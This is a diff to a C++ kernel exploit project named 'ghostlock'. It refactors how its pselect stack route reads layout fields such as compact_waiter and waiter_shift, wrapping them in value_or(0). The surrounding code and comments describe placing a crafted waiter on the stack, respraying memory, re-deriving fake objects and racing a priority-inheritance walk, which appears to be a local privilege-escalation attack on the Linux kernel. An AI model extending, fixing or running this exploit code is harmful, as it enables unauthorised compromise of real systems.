@@ -166,7 +166,7 @@ namespace ghostlock::route {
  * common route dispatcher remains scheduled for S14. */
     static uint32_t route_delay_usec(const select_stack::SelectStackRoute *context,
                                 int32_t attempt) {
-        if (!context->layout.compact_waiter) {
+        if (!context->layout.compact_waiter.value_or(0)) {
             (void) attempt;
             /* Let select establish its frame and stamp the crafted waiter before
          * the PI walk fires. */
@@ -225,7 +225,7 @@ namespace ghostlock::route {
 
     static int32_t pselect_waiter_shift(const select_stack::SelectStackRoute *context) {
         return session::g_exploit_session.profile.loaded()
-                   ? context->layout.waiter_shift
+                   ? context->layout.waiter_shift.value_or(0)
                    : kernel::PSELECT_WAITER_WORD_SHIFT;
     }
 
@@ -295,7 +295,7 @@ namespace ghostlock::route {
         ex->zero();
 
         int32_t words_per_set = pselect_words_per_set();
-        int32_t compact = context->layout.compact_waiter;
+        int32_t compact = context->layout.compact_waiter.value_or(0);
 
         struct pselect_waiter_word {
             int32_t word;
@@ -419,7 +419,7 @@ namespace ghostlock::route::select_stack {
      * attempt resprays and re-derives fake_* before rebuilding the fd_sets.
      * The consumer handshake advances consumer_go per attempt so the trigger
      * is seen as a new sequence. */
-        const int32_t attempts = layout.compact_waiter ? 4 : 1;
+        const int32_t attempts = layout.compact_waiter.value_or(0) ? 4 : 1;
         int32_t calls_total = 0;
         int32_t successes_total = 0;
 
@@ -448,10 +448,10 @@ namespace ghostlock::route::select_stack {
             race->consumer_go.store(attempt);
 
             pr_info("pselect pre-select attempt=%d/%d compact=%d +%.0fms\n",
-                    attempt, attempts, layout.compact_waiter,
+                    attempt, attempts, layout.compact_waiter.value_or(0),
                     route::fops_elapsed_ms(&route_t0));
             errno = 0;
-            if (layout.compact_waiter) {
+            if (layout.compact_waiter.value_or(0)) {
                 uint32_t timeout_us = profile.select_timeout_us();
                 struct timespec ts = {
                     .tv_sec = timeout_us / 1000000,
@@ -473,7 +473,7 @@ namespace ghostlock::route::select_stack {
             select_errno = errno;
             route::restore_standard_io(stdio_backup);
             pr_info("pselect post-select attempt=%d/%d compact=%d +%.0fms ret=%d\n",
-                    attempt, attempts, layout.compact_waiter,
+                    attempt, attempts, layout.compact_waiter.value_or(0),
                     route::fops_elapsed_ms(&route_t0), select_result);
             race->consumer_go.store(0);
 
